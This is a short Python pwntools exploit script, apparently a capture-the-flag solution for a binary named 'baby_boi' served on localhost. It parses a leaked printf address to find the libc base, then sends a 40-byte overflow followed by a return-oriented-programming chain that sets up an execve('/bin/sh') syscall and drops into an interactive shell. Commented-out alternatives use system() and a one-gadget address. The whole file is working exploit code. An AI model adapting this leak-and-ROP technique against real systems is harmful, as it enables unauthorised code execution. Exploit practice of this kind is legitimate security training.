from pwn import *

elf = context.binary = ELF("./baby_boi")
libc = ELF("docker/libc-2.27.so")

p = remote("localhost",8000)
# p = process(["./ld-linux-x86-64.so.2", "./baby_boi"])




p.recvuntil(b"am: ")

PRINTF_LEAK = int(p.recvline().decode()[2:],16)

libc.address =  PRINTF_LEAK  - libc.sym["printf"]

# payload = flat([
    # b"A" * 40,
    # 0x0000000000400793, #: pop rdi ; ret,
    # next(libc.search(b"/bin/sh")),
    # elf.sym["main"] + 167,
    # libc.sym["system"]
# ])

payload = flat([
    b"A" * 40,
    libc.address + 0x00000000000439c8, #: pop rax ; ret
    0x3b,
    0x0000000000400793, #: pop rdi ; ret,
    next(libc.search(b"/bin/sh")),
    libc.address + 0x0000000000023e6a, #: pop rsi ; ret
    0x0,
    libc.address + 0x0000000000001b96, #: pop rdx ; ret
    0x0,
    libc.address +  0x00000000000013c0 # : syscall
])



# payload = flat([
#     b"A" * 0x28,
#     libc.address + 0x4f322,
# ])
# 
# gdb.attach(p)
p.sendline(payload)

p.interactive()

